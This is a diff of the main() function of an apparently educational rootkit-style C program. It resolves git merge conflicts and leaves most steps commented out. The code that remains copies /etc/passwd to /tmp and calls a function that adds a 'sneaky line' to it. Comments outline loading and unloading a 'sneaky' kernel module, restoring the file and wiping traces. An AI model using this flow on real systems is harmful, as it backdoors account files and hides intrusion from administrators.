@@ -161,33 +161,21 @@ int main(){
   //First malicious act. Copy /etc/passwd file to a new file: /tmp/passwd
   copy_file(etc, temp);
 
-  //Add the line
+  //Add the sneaky line
   add_sneaky_line(etc);
   
   //Load the sneaky module using the insmod command
-<<<<<<< HEAD
-  //  load_module();
+  //load_module();
 
   //Enter a loop when the module is being uploaded
-  // loop();
-=======
-  // load_module();
-
-  //Enter a loop when the module is being uploaded
-   loop();
->>>>>>> ddc5e4517b46e03ebbe93722de0e6c746e66582d
+  //loop();
 
   //Exit from the loop suggests removing the module using rmmod
   // unload_module();
 
-  //Restore the original file
-<<<<<<< HEAD
-  // copy_file(temp, etc);
-=======
-   copy_file(temp, etc);
->>>>>>> ddc5e4517b46e03ebbe93722de0e6c746e66582d
+  //copy_file(temp, etc);
 
-  //Delete the content of tmp file
+  //Delete the content of tmp file, no trace remains of sneaky attack
   // fopen(temp, "w");
   
 }
